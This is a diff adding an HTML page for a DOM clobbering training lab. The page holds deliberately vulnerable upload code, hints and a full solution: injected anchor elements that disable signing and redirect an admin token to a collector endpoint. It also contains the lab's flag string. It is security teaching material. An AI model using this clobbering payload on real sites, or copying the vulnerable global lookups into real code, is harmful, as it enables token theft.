@@ -1,0 +1,206 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Lab 5 · Capstone: unsigned upload</title>
+<link rel="stylesheet" href="/css/lab.css">
+</head>
+<body>
+<header class="top">
+  <a href="/">← DOM Clobbering Lab</a>
+  <span class="badge">Lab 5 · hard</span>
+</header>
+
+<main>
+  <h1>Capstone: unsigned upload</h1>
+  <p class="lede">
+    This export service signs its uploads with an HMAC before sending them to a fixed
+    endpoint. Both decisions are read from globals. Your goal: deliver an
+    <strong>unsigned</strong> payload containing the admin token to <code>/collect</code>.
+  </p>
+  <p class="lede">
+    You need two independent clobbers. Either one alone is not enough —
+    clobbering only the guard leaves a signed request at the legit endpoint, and clobbering
+    only the destination still signs the data.
+  </p>
+
+  <section class="card grid2">
+    <div>
+      <h2>Victim code</h2>
+<pre><code>const guard = window.uploadGuard
+           || { verify: true };
+const dest  = window.uploadDest
+           || { url: '/api/upload' };
+
+const record = {
+  ref: REF, file: 'customers.csv',
+  rows: 12840, token: ADMIN_TOKEN
+};
+
+let body;
+if (guard.verify) {
+  body = sign(record);   // {..., signed: true, sig}
+} else {
+  body = JSON.stringify(
+    Object.assign({}, record, { signed: false }));
+}
+
+fetch(dest.url, {
+  method: 'POST',
+  headers: { 'content-type': 'application/json' },
+  body
+});</code></pre>
+    </div>
+
+    <div>
+      <h2>Your HTML injection</h2>
+      <textarea id="payload" spellcheck="false" placeholder="&lt;p&gt;hello&lt;/p&gt;"></textarea>
+      <div class="row">
+        <button id="run">Render &amp; run app</button>
+        <button id="verify" class="ghost">Verify exploit</button>
+        <button id="reset" class="ghost">Reset page</button>
+      </div>
+
+      <details>
+        <summary>Hint 1 — the guard</summary>
+        <p style="color:#b7c2d0;margin:8px 0 0">
+          <code>guard.verify</code> must become falsy. A single clobbered element gives you an
+          object whose missing properties are <code>undefined</code>.
+        </p>
+      </details>
+
+      <details>
+        <summary>Hint 2 — the destination</summary>
+        <p style="color:#b7c2d0;margin:8px 0 0">
+          <code>dest.url</code> must become a string that fetches from your collector. Two
+          elements with <code>id="uploadDest"</code> make <code>window.uploadDest</code> a
+          collection; add <code>name="url"</code> to the second so
+          <code>dest.url</code> resolves to it. <code>fetch()</code> coerces it to a USVString.
+        </p>
+      </details>
+
+      <details>
+        <summary>Solution</summary>
+<pre><code>&lt;a id="uploadGuard"&gt;&lt;/a&gt;
+&lt;a id="uploadDest"&gt;&lt;/a&gt;
+&lt;a id="uploadDest" name="url" href="/collect"&gt;&lt;/a&gt;</code></pre>
+        <p style="color:#b7c2d0;margin:8px 0 0">
+          <code>window.uploadGuard</code> is an anchor, so <code>.verify</code> is
+          <code>undefined</code> → no signing. <code>window.uploadDest</code> is a collection,
+          and <code>.url</code> is the second anchor whose <code>toString()</code> is its
+          <code>href</code>, so <code>fetch()</code> posts to <code>/collect</code>.
+        </p>
+      </details>
+    </div>
+  </section>
+
+  <section class="card">
+    <h2>Rendered injection <span class="muted">(#victim)</span></h2>
+    <div id="victim" class="victim"></div>
+  </section>
+
+  <section class="card">
+    <h2>App output / evidence</h2>
+    <div id="evidence" class="log"></div>
+  </section>
+
+  <div id="flag" class="flag hidden"></div>
+</main>
+
+<script src="/js/lab.js"></script>
+<script>
+(function () {
+  "use strict";
+
+  var RKEY = "domlab.lab5.ref";
+  var TKEY = "domlab.lab5.token";
+  if (!sessionStorage.getItem(RKEY)) {
+    sessionStorage.setItem(RKEY, "EXP-" + Math.random().toString(36).slice(2, 8).toUpperCase());
+  }
+  if (!sessionStorage.getItem(TKEY)) {
+    sessionStorage.setItem(TKEY, "admin_" + Math.random().toString(36).slice(2, 14));
+  }
+  var REF = sessionStorage.getItem(RKEY);
+  var ADMIN_TOKEN = sessionStorage.getItem(TKEY);
+
+  var lastTarget = null;
+
+  function sign(record) {
+    return JSON.stringify(Object.assign({}, record, {
+      signed: true,
+      sig: "HMAC-" + ADMIN_TOKEN.slice(-6)
+    }));
+  }
+
+  function runVictim() {
+    Lab.startedAt = Date.now();
+    Lab.clearLog();
+
+    Lab.inject(document.getElementById("payload").value);
+
+    /* ==================== VICTIM CODE ==================== */
+    var guard = window.uploadGuard || { verify: true };
+    var dest = window.uploadDest || { url: "/api/upload" };
+
+    var record = {
+      ref: REF,
+      file: "customers.csv",
+      rows: 12840,
+      token: ADMIN_TOKEN
+    };
+
+    Lab.log("window.uploadGuard.verify -> " + Lab.describe(guard.verify));
+    Lab.log("window.uploadDest.url -> " + Lab.describe(dest.url));
+
+    var body;
+    if (guard.verify) {
+      body = sign(record);
+      Lab.log("payload signed");
+    } else {
+      body = JSON.stringify(Object.assign({}, record, { signed: false }));
+      Lab.log("payload NOT signed", "bad");
+    }
+
+    lastTarget = dest.url;
+    Lab.log("uploading to " + dest.url);
+
+    fetch(dest.url, {
+      method: "POST",
+      headers: { "content-type": "application/json" },
+      body: body
+    }).then(function () {
+      Lab.log("upload request completed");
+    }).catch(function () {
+      Lab.log("upload request failed", "warn");
+    });
+    /* ===================================================== */
+  }
+
+  function verify() {
+    Lab.wait(450).then(function () {
+      return Lab.since(Lab.startedAt);
+    }).then(function (rows) {
+      var hit = rows.filter(function (e) {
+        var body = String(e.body || "");
+        return e.path === "/collect" &&
+          body.indexOf(ADMIN_TOKEN) !== -1 &&
+          /"signed"\s*:\s*false/.test(body);
+      });
+      if (hit.length) {
+        Lab.log("Exploit confirmed: unsigned export with the admin token received.", "good");
+        Lab.solved("lab5", "FLAG{tw0_g4dg3t5_0n3_p4yl04d}");
+      } else {
+        Lab.log("No qualifying upload at /collect. Last target: " + lastTarget, "warn");
+      }
+    });
+  }
+
+  Lab.wire({ run: runVictim, verify: verify });
+
+  Lab.showExistingSolve("lab5");
+  runVictim();
+})();
+</script>
+</body>
+</html>
